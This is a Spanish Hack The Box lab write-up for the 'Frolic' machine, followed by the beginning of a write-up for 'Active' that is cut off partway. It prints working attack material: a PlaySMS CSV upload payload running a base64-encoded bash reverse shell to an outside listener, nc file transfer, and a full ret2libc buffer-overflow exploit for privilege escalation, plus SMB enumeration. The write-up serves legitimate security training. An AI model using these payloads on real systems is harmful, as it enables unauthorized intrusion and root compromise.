http://10.10.10.111:9999/admin/js/login.js  varattempt=3; // Variable to count number of attempts. // Below function Executes on click of login button. functionvalidate(){ varusername=document.getElementById(\"username\").value; varpassword=document.getElementById(\"password\").value; if( username==\"admin\"\u0026amp;\u0026amp;password==\"superduperlooperpassword_lol\"){  alert(\"Login successfully\"); window.location=\"success.html\"; // Redirecting to other page. returnfalse; } else{ attempt--;// Decrementing by one. alert(\"You have left \"+attempt+\" attempt;\"); // Disabling fields after 3 attempts. if( attempt==0){ document.getElementById(\"username\").disabled =true; document.getElementById(\"password\").disabled =true; document.getElementById(\"submit\").disabled =true; returnfalse; } } }  Vale, tenemos una contraseña (superduperlooperpassword_lol) y también el archivo al que tenemos que ir si la autenticación es exitosa. Entonces podemos acceder directamente:\n$ curl 10.10.10.111:9999/admin/success.html ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?.  ¿Qué es esto? parece un lenguaje esotérico (algo similar a Brainfuck). Si investigamos un poco, descubriremos que es \u0026ldquo;Ook!\u0026rdquo;, por lo que vamos a decodificarlo en www.dcode.fr:\nComo dice, vamos a /asdiSIAJJ0QWE9JAS:\n$ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA  Parece que tenemos datos codificados en Base64. Si lo decodificamos, veremos los bytes mágicos PK, por lo que será un archivo ZIP:\n$ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -s | base64 -d PK É7M#[i index.phpUT |[|[ux ^DJsh) $ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -s | base64 -d | xxd 00000000: 504b 0304 1400 0900 0800 c389 374d 23fe PK..........7M#. 00000010: 5b14 b000 0000 6902 0000 0900 1c00 696e [.....i.......in 00000020: 6465 782e 7068 7055 5409 0003 857c a75b dex.phpUT....|.[ 00000030: 857c a75b 7578 0b00 0104 0000 0000 0400 .|.[ux.......... 00000040: 0000 005e 44e6 104a 9f73 b268 8a29 9a1b ...^D..J.s.h.).. 00000050: 9550 f06e 0ba9 bf53 73e4 024a 771a 11dc .P.n...Ss..Jw... 00000060: 8ee5 a034 e2f6 d98f 6bee 7ad0 128a 55c8 ...4....k.z...U. 00000070: 96ec 2b58 ba7f e050 c8e1 12e1 b687 a4ea ..+X...P........ 00000080: d0bb e278 5f13 c04e 895b fd8d 8453 aaea ...x_..N.[...S.. 00000090: 38f2 83f2 e20f 914a 3253 c72a 8303 44d0 8......J2S.*..D. 000000a0: 8d7d 9338 6454 0e51 026b de10 cad7 e3e4 .}.8dT.Q.k...... 000000b0: fb6a 5f9f 8bf9 18e9 94c0 2778 7f63 90c2 .j_.......'x.c.. 000000c0: 16dd 8f74 beb2 3735 51ac 0b9a 8a03 0e95 ...t..75Q....... 000000d0: 106b 032c 34b5 d962 29be 3446 b5e9 0609 .k.,4..b).4F.... 000000e0: ffba 84e3 96ea e9ef c726 7132 6f88 57d4 .........\u0026q2o.W. 000000f0: 9ce3 3950 4b07 0823 fe5b 14b0 0000 0069 ..9PK..#.[.....i 00000100: 0200 0050 4b01 021e 0314 0009 0008 00c3 ...PK........... 00000110: 8937 4d23 fe5b 14b0 0000 0069 0200 0009 .7M#.[.....i.... 00000120: 0018 0000 0000 0001 0000 00a4 8100 0000 ................ 00000130: 0069 6e64 6578 2e70 6870 5554 0500 0385 .index.phpUT.... 00000140: 7ca7 5b75 780b 0001 0400 0000 0004 0000 |.[ux........... 00000150: 0000 504b 0506 0000 0000 0100 0100 4f00 ..PK..........O. 00000160: 0000 0301 0000 0000 ........  Y de hecho, lo es:\n$ curl 10.10.10.111:9999/asdiSIAJJ0QWE9JAS/ -s | base64 -d \u0026gt; file.zip $ file file.zip file.zip: Zip archive data, at least v2.0 to extract, compression method=deflate  Vamos a ver qué hay dentro y a extraerlo:\n$ unzip -l file.zip Archive: file.zip Length Date Time Name --------- ---------- ----- ---- 617 09-23-2018 13:44 index.php --------- ------- 617 1 file $ unzip file.zip Archive: file.zip [file.zip] index.php password:  Vaya, tiene contraseña. Con fcrackzip podemos probar contraseñas de rockyou.txt:\n$ fcrackzip -uDp $WORDLISTS/rockyou.txt file.zip PASSWORD FOUND!!!!: pw == password $ unzip file.zip Archive: file.zip [file.zip] index.php password: inflating: index.php  Ahora tenemos la contraseña y podemos extraer index.php. En este archivo tenemos datos codificados en hexadecimal, vamos a decodificarlo:\n$ cat index.php 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a $ cat index.php | xxd -r -p KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==  Y ahora parece que está en Base64:\n$ cat index.php | xxd -r -p | base64 -d +++++ +++++ [-\u0026gt;++ +++++ +++\u0026lt;] \u0026gt;++++ +.--- --.++ +++++ .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---- --.-- ----- .\u0026lt;+++ +[-\u0026gt;+ +++\u0026lt;] \u0026gt;+++. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- .\u0026lt;+++ [-\u0026gt;++ +\u0026lt;]\u0026gt;+ .---. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; ++..\u0026lt;  Y este es otro lenguaje esotérico: Braifuck. Podemos ir de nuevo a www.dcode.fr y decodificarlo:\nY nos muestra otras contraseña: idkwhatispass.\nSiguiendo con la enumeración web, no tenemos acceso a /dev:\n$ curl 10.10.10.111:9999/dev/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\"white\"\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.10.3 (Ubuntu)\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Pero vamos a aplicar fuzzing para ver más directorios:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/dev/FUZZ -e .html,.txt test [Status: 200, Size: 5, Words: 1, Lines: 2, Duration: 43ms] backup [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 76ms] .html [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 45ms] [Status: 403, Size: 178, Words: 5, Lines: 8, Duration: 45ms]  Vale, vamos a probar estas rutas:\n$ curl 10.10.10.111:9999/dev/test test $ curl 10.10.10.111:9999/dev/backup/ /playsms  Muestra playsms. De hecho, si vamos a http://10.10.10.111:9999/playsms, nos redirige a una instancia de PlaySMS:\nAquí podemos acceder con credenciales admin:idkwhatispass:\nIntrusión en la máquina Podemos buscar vulnerabilidades y exploits para esta tecnología:\n$ searchsploit playsms --------------------------------------------------------------------------------------- ----------------------- Exploit Title | Path --------------------------------------------------------------------------------------- ----------------------- PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit) | php/remote/44598.rb PlaySMS - index.php Unauthenticated Template Injection Code Execution (Metasploit) | php/remote/48335.rb PlaySms 0.7 - SQL Injection | linux/remote/404.pl PlaySms 0.8 - 'index.php' Cross-Site Scripting | php/webapps/26871.txt PlaySms 0.9.3 - Multiple Local/Remote File Inclusions | php/webapps/7687.txt PlaySms 0.9.5.2 - Remote File Inclusion | php/webapps/17792.txt PlaySms 0.9.9.2 - Cross-Site Request Forgery | php/webapps/30177.txt PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload | php/webapps/42003.txt PlaySMS 1.4 - 'import.php' Remote Code Execution | php/webapps/42044.txt PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit) | php/remote/44599.rb PlaySMS 1.4 - Remote Code Execution | php/webapps/42038.txt PlaySMS 1.4.3 - Template Injection / Remote Code Execution | php/webapps/48199.txt --------------------------------------------------------------------------------------- ----------------------- Shellcodes: No Results  Hay varios. Aunque no sabemos la versión exacta, podemos probar algunos de ellos hasta encontrar que 42044.txt funciona:\n$ head -47 42044.txt # Exploit Title: PlaySMS 1.4 Remote Code Execution using Phonebook import Function in import.php # Date: 21-05-2017 # Software Link: https://playsms.org/download/ # Version: 1.4 # Exploit Author: Touhid M.Shaikh # Contact: http://twitter.com/touhidshaikh22 # Website: http://touhidshaikh.com/ # Category: webapps 1. Description Code Execution using import.php We know import.php accept file and just read content not stored in server. But when we stored payload in our backdoor.csv and upload to phonebook. Its execute our payload and show on next page in field (in NAME,MOBILE,Email,Group COde,Tags) accordingly . In My case i stored my vulnerable code in my backdoor.csv files's Name field . But There is one problem in execution. Its only execute in built function and variable which is used in application. That why the server not execute our payload directly. Now i Use \"\u0026lt;?php $a=$_SERVER['HTTP_USER_AGENT']; system($a); ?\u0026gt;\" in name field and change our user agent to any command which u want to execute command. Bcz it not execute \u0026lt;?php system(\"id\")?\u0026gt; directly . Example of my backdoor.csv file content ----------------------MY FILE CONTENT------------------------------------ Name Mobile Email Group code Tags \u0026lt;?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?\u0026gt; 22 --------------------MY FILE CONTENT END HERE------------------------------- For More Details : www.touhidshaikh.com/blog/ For Video Demo : https://www.youtube.com/watch?v=KIB9sKQdEwE 2. Proof of Concept Login as regular user (created user using index.php?app=main\u0026inc=core_auth\u0026route=register): Go to : http://127.0.0.1/playsms/index.php?app=main\u0026inc=feature_phonebook\u0026route=import\u0026op=list And Upload my malicious File.(backdoor.csv) and change our User agent.  La idea es introducir código PHP en un archivo CSV y subirlo desde \u0026ldquo;Send From File\u0026rdquo;:\nEntonces vamos a construir este archivo CSV malicioso con un comando de reverse shell:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u0026gt;\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ vim file.csv $ cat file.csv \u0026lt;?php system('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'); ?\u0026gt;,2,3  Al subirlo, obtenemos la conexión de vuelta:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.111. Ncat: Connection from 10.10.10.111:37598. bash: cannot set terminal process group (1237): Inappropriate ioctl for device bash: no job control in this shell www-data@frolic:~/html/playsms$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@frolic:~/html/playsms$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@frolic:~/html/playsms$ export TERM=xterm www-data@frolic:~/html/playsms$ export SHELL=bash www-data@frolic:~/html/playsms$ stty rows 50 columns 158  Enumeración del sistema Si enumeramos binarios SUID, vemos uno extraño llamado /home/ayush/.binary/rop:\nwww-data@frolic:~/html/playsms$ cd www-data@frolic:~$ find / -perm -4000 2/dev/null /sbin/mount.cifs /bin/mount /bin/ping6 /bin/fusermount /bin/ping /bin/umount /bin/su /bin/ntfs-3g /home/ayush/.binary/rop /usr/bin/passwd /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/newuidmap /usr/bin/pkexec /usr/bin/at /usr/bin/sudo /usr/bin/newgidmap /usr/bin/chsh /usr/bin/chfn /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/i386-linux-gnu/lxc/lxc-user-nic /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign www-data@frolic:~$ ls -l /home/ayush/.binary/rop -rwsr-xr-x 1 root root 7480 Sep 25 2018 /home/ayush/.binary/rop  Se trata de un binario SUID que pertenece a root. Por tanto, podemos ejecutar el archivo como root. Vamos a ver qué tenemos:\nwww-data@frolic:~$ /home/ayush/.binary/rop [*] Usage: program \u0026lt;message\u0026gt; www-data@frolic:~$ /home/ayush/.binary/rop asdf asdf  En este punto, podemos ver si es vulnerable a Buffer Overflow al introducir una gran cantidad de datos:\nwww-data@frolic:~$ /home/ayush/.binary/rop $(python3 -c 'print(\"A\" * 100)') Segmentation fault (core dumped)  Perfecto, es vulnerable. Vamos a transferir el binario a nuestra máquina de atacante usando nc para analizarlo y explotarlo:\nwww-data@frolic:~$ which nc /bin/nc www-data@frolic:~$ md5sum /home/ayush/.binary/rop 001d6cf82093a0d716587169e019de7d /home/ayush/.binary/rop www-data@frolic:~$ nc 10.10.17.44 4444 \u0026lt; /home/ayush/.binary/rop  $ nc -nlvp 4444 \u0026gt; rop Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.111. Ncat: Connection from 10.10.10.111:37600. $ md5sum rop 001d6cf82093a0d716587169e019de7d rop  Genial. Si usamos Ghidra para realizar ingeniería inversa sobre el binario, veremos esta función main:\nundefined4 main(intparam_1, intparam_2) { undefined4 uVar1; setuid(0); if(param_1 \u0026lt;2) { puts(\"[*] Usage: program \u0026lt;message\u0026gt;\"); uVar1 =0xffffffff; } else{ vuln(*(undefined4 *) (param_2 +4)); uVar1 =0; } returnuVar1; }  Y dicha función llama a vuln:\nvoidvuln(char*param_1) { charlocal_34[48]; strcpy(local_34, param_1); printf(\"[+] Message sent: \"); printf(local_34); return; }  Aquí tenemos dos vulnerabilidades. El Buffer Overflow existe porque local_34 tiene 48 bytes reservados como buffer, pero strcpy es una función vulnerable que no tiene en cuenta el buffer disponible y puede copiar datos fuera de los límites, derivando en Buffer Overflow que puede sobrescribir la dirección de retorno.\nLa segunda vulnerabilidad es Format String, porque nuestros datos de entrada se pasan a printf como primer parámetro, por lo que podemos introducir formatos y fugar valores de la pila y modificar datos también. Una sencilla prueba de concepto:\nwww-data@frolic:~$ /home/ayush/.binary/rop %x.%x. [+] Message sent: bfffff5f.bffffd60.  No obstante, solamente explotaremos la vulnerabilidad de Buffer Overflow.\nExplotación de Buffer Overflow Vamos a comenzar por abrir GDB y obtener el offset necesario para sobrescribir la dirección de retorno:\n$ gdb -q rop Reading symbols from rop... (No debugging symbols found in rop) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa [+] Saved as '$_gef0' gef➤ run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Starting program: /home/rocky/Desktop/HTB/Machines/Frolic/rop aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa yaaa Program received signal SIGSEGV, Segmentation fault. 0x6161616e in ?? ()  gef➤ pattern offset $eip [+] Searching for '$eip' [+] Found at offset 52 (little-endian search) likely [+] Found at offset 49 (big-endian search)  Genial, necesitamos introducir 52 caracteres, y los siguientes sobrescribirán valores de la pila (por ejemplo, la dirección de retorno, que se copia en el registro $eip).\nPara poder explotar el binario, tenemos que saber sus protecciones con checksec:\ngef➤ checksec [+] checksec for './rop' Canary : ✘ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : Partial  La más importante en esta situación es NX, que está habilitada, por lo que la pila (stack) no es ejecutable. Por tanto, tenemos que usar una técnica llamada Return Oriented Programming (ROP), como dice el nombre del binario. En concreto, usaremos un ataque Ret2Libc, que implica controlar el flujo de ejecución del programa y ejecutar system(\u0026quot;/bin/sh\u0026quot;) en Glibc.\nVamos a ver si ASLR está habilitado en la máquina:\nwww-data@frolic:~$ cat /proc/sys/kernel/randomize_va_space 0  No lo está, lo cual significa que todas las direcciones de las librerías compartidas (como Glibc) son fijas.\nSolo para tener el mismo entorno, vamos a deshabilitar ASLR y obtener las direcciones de system y \u0026quot;/bin/sh\u0026quot;:\ngef➤ aslr off [+] Disabling ASLR gef➤ p system $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e08360 \u0026lt;system\u0026gt; gef➤ grep \"/bin/sh\" [+] Searching '/bin/sh' in memory [+] In '/usr/lib32/libc-2.31.so'(0xf7f38000-0xf7fac000), permission=r-- 0xf7f52363 - 0xf7f5236a → \"/bin/sh\"  Perfecto, pues la manera de realizar un ataque Ret2Libc en binarios de 32 bits es\n\u0026lt;function-address\u0026gt; + \u0026lt;return-address\u0026gt; + \u0026lt;arg-1\u0026gt; + \u0026lt;arg-2\u0026gt; + ...  ya que todos los datos pasados a las funciones se almacenan en la pila. Por tanto \u0026lt;function-address\u0026gt; es 0xf7e08360 (como bytes, en formato little-endian), \u0026lt;return-address\u0026gt; puede ser cualquie cosa, y \u0026lt;arg-1\u0026gt; es 0xf7f52363 (como bytes), que es la dirección de la cadena \u0026quot;/bin/sh\u0026quot;.\nUsando struct.pack para formatear los números como bytes, tenemos el siguiente payload y explotamos el binario correctamente (obtenemos una shell):\n$ ./rop $(python3 -c 'import os; from struct import pack; os.write(1, b\"A\" * 52 + pack(\"\u0026lt;I\", 0xf7e08360) + b\"A\" * 4 + pack(\"\u0026lt;I\", 0xf7f52363))') $ ls rop  Escalada de privilegios Para explotar el binario en la máquina remota, tenemos que encontrar las direcciones exactas de system y \u0026quot;/bin/sh\u0026quot; en la librería Glibc remota. Afortunadamente, tenemos readelf:\nwww-data@frolic:~$ which readelf /usr/bin/readelf www-data@frolic:~$ ldd /home/ayush/.binary/rop linux-gate.so.1 =\u0026gt; (0xb7fda000) libc.so.6 = /lib/i386-linux-gnu/libc.so.6 (0xb7e19000) /lib/ld-linux.so.2 (0xb7fdb000) www-data@frolic:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 245: 00112f20 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.0 627: 0003ada0 55 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1457: 0003ada0 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0 www-data@frolic:~$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh 15ba0b /bin/sh  Nótese que estos valores no son direcciones sino offsets. Necesitamos añadir el offset a la dirección base de Glibc (que está fijada en 0xb7e19000):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0xb7e19000 + 0x3ada0) '0xb7e53da0' \u0026gt;\u0026gt;\u0026gt; hex(0xb7e19000 + 0x15ba0b) '0xb7f74a0b'  Una vez que tenemos las direcciones reales, podemos explotar el binario usando Python:\nwww-data@frolic:~$ which python3 /usr/bin/python3 www-data@frolic:~$ /home/ayush/.binary/rop $(python3 -c 'import os; from struct import pack; os.write(1, b\"A\" * 52 + pack(\"\u0026lt;I\", 0xb7e53da0) + b\"A\" * 4 + pack(\"\u0026lt;I\", 0xb7f74a0b))') # cat /home/ayush/user.txt 2ab95909cf509f85a6f476b59a0c2fe0 # cat /root/root.txt 85d3fdf03f969892538ba9a731826222  ","image":"/images/HTB/Frolic/Frolic.png","permalink":"https://7rocky.github.io/htb/frolic/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene una página web que almacena algunos archivos con varias codificaciones y lenguajes esotéricos. Finalmente, podemos llegar a una instancia de PlaySMS que es vulnerable a RCE mediante PHP. La máquina contiene un binario SUID que es vulnerable a Buffer Overflow y permite la escalada de privilegios","time":11,"title":"Frolic"},{"contents":"  SO: Windows   Dificultad: Fácil   Dirección IP: 10.10.10.100   Fecha: 28 / 07 / 2018   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.100 -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49182 Nmap scan report for 10.10.10.100 Host is up (0.10s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: ) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49169/tcp open msrpc Microsoft Windows RPC 49171/tcp open msrpc Microsoft Windows RPC 49182/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows  Host script results: |_clock-skew: 12m57s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: |_ start_date:  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 71.22 seconds La máquina tiene abiertos los puertos 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) y 445 (SMB), entre otros.\n$ crackmapexec smb 10.10.10.100 SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) Además, vemos que la máquina es un controlador de dominio (DC) de un entorno de Active Directory (AD). Podemos empezar añadiendo active.htb en /etc/hosts.\nEnumeración por SMB Utilizando smbmap y una sesión anónima, podemos enumerar los recursos compartidos por SMB:\n$ smbmap -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -H 10.10.10.100 [+] IP: 10.10.10.100:445 Name: 10.10.10.100  Disk Permissions Comment  ---- ----------- -------  ADMIN$ NO ACCESS Remote Admin  C$ NO ACCESS Default share  IPC$ NO ACCESS Remote IPC  NETLOGON NO ACCESS Logon server share  Replication READ ONLY  SYSVOL NO ACCESS Logon server share  Users NO ACCESS Como se puede ver, tenemos acceso a un recurso llamado Replication. Podemos descargar todos los archivos utilizando smbclient como sigue:\n$ smbclient \\\\\\\\10.10.10.100\\\\Replication -N Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir  . D 0 Sat Jul 21 06:37:44 2018  .. D 0 Sat Jul 21 06:37:44 2018  active.htb D 0 Sat Jul 21 06:37:44 2018  10459647 blocks of size 4096. 5725771 blocks available smb: \\\u0026gt; cd active.htb smb: \\active.htb\\\u0026gt; recurse ON smb: \\active.htb\\\u0026gt; prompt OFF smb: \\active.htb\\\u0026gt; mget * getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (7.7 KiloBytes/sec) (average 2.0 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.4 KiloBytes/sec) (average 1.9 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.0 KiloBytes/sec) (average 2.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 3722 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (10.4 KiloBytes/sec) (average 3.2 KiloBytes/sec) Y ahora tenemos estos archivos en local:\n$ tree active.htb active.htb ├── DfsrPrivate │ ├── ConflictAndDeleted │ ├── Deleted │ └── Installing ├── Policies │ ├── 